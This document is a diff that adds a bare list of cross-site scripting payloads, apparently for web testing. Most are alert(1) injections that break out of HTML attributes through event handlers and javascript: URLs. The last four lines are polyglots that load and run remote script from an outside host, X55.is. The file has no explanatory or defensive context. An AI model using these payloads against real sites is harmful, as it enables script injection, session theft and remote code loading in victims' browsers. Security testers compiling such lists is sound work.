@@ -1,0 +1,27 @@
+"><svg/onload=alert(1)>
+"><img src=x onerror="alert(1)">
+"><input type="text" value="Click me" autofocus onfocus="alert(1)">
+"><textarea autofocus onfocus=alert(1)></textarea>
+"><div onmouseover="alert(1)">Hover me</div>
+"><button onclick="alert(1)">Click me</button>
+"><marquee onstart="alert(1)">Test</marquee>
+"><input onblur="alert(1)" value="Click outside this field">
+"><details open ontoggle="alert(1)">
+"><meta http-equiv="refresh" content="0;url=javascript:alert(1);">
+"><object data="javascript:alert(1)"></object>
+"><embed src="javascript:alert(1)">
+"><iframe src="javascript:alert(1)"></iframe>
+"><svg><a xlink:href="javascript:alert(1)">click</a></svg>
+"><link rel="import" href="javascript:alert(1)">
+"><base href="javascript:alert(1)">
+"><plaintext><script>alert(1)</script>
+"><bgsound src="javascript:alert(1)">
+"><frame src="javascript:alert(1)">
+"><xss id=x onmouseenter=alert(1)>
+"><keygen autofocus onfocus=alert(1)>
+"><form><button formaction="javascript:alert(1)">Click me</button></form>
+"><video><source onerror="javascript:alert(1)">
+JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is?1=18369/.source))}//\76-->
+'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=/**/(import(/https:\\X55.is?1=18369/.source))//>
+<Script /Src=https://X55.is?1=18369></Script>
+"><svg><a xlink:href="https://X55.is?1=18369/.source">click</a></svg>
